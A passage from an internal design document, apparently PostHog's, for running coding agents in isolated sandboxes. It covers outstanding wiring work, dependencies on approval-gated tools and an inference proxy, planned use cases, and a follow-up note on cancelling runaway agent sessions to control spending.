**synchronous** — it blocks until the turn completes and returns the
outcome in the response body, while `turn_complete` streams over SSE
_during_ that await. The supervisor must mark the turn as in-flight before
sending, not after, or it ignores its own completion.

Still owed: wire `runCodingSession` into the worker (a guard-clause branch
in `runSession` on `spec.sandbox` + a `CodingSandboxPool` on
`RunSessionDeps` + event→bus/log mapping — deferred to avoid clobbering
concurrent work in the runner), and the inference proxy / tier-3 MCP
broker / Modal backend / snapshot. Two local-dev shims remain (gateway
`context_window` injection, model-SKU selection) — both are local-gateway
quirks to productionize away, not platform issues.

## 12. Dependencies + what this enables

**Depends on:**

- [`sandboxed-agent-inference.md`](sandboxed-agent-inference.md) — the
  capability/tool/trust-profile layer this topology runs underneath. Ship
  in lockstep; this plan supplies the security substrate it assumes.
- [`approval-gated-tools.md`](approval-gated-tools.md) — dangerous code
  actions are approval-gated via the harness permission hook.
- The tasks product's harness + Modal + agentsh stack
  (`products/tasks/backend/services/`) — the substrate we converge on
  rather than reinvent. This plan's success is partly measured by the two
  products sharing one sandbox + harness.
- AI gateway scoped-token support (§8, open q #6).

**Enables:**

- Every use case in
  [`sandboxed-agent-inference.md`](sandboxed-agent-inference.md) §12
  (codebase Q&A, refactor proposer, release-health investigator,
  executable runbooks, automated PR reviewer) — on a topology where giving
  the agent a shell doesn't put customer secrets one `env` away.
- A future "self-healing agents" plan — an agent that proposes edits to
  its own definition needs a coding sandbox to test the rewrite, and the
  tier separation keeps that sandbox off the live spec and its secrets.
- Convergence dividends: improvements to the shared harness (new tools,
  better prompts, faster snapshots) accrue to both the tasks product and
  the agent platform at once.

## 13. Follow-up scratchpad

Running list of follow-up thoughts to fold into the design as they come
up. Terse on purpose — capture now, design later.

- **Stop / cancel a running agent from the client (cost control).** We
  must be able to halt an in-flight coding session on demand, the same
  way the in-process runner can, so a runaway agent can't overspend.
  Mechanism already exists: the harness exposes a `cancel` JSON-RPC
  command (`cancel` / `posthog/cancel`, see `schemas.ts`). Wiring: a
  client "stop" → supervisor sends `cancel` → confirm the in-flight model
  call actually halts (does `cancel` abort the current gateway request,
  or only stop the next turn? verify against the harness). Backstop:
  supervisor hard-kills the sandbox (`docker rm -f` / Modal terminate) so
  spend stops even if `cancel` is slow. Also tie into the budget choke
  point (§8 inference proxy) — the proxy should reject further inference
  for a stopped/over-budget session regardless of harness state.
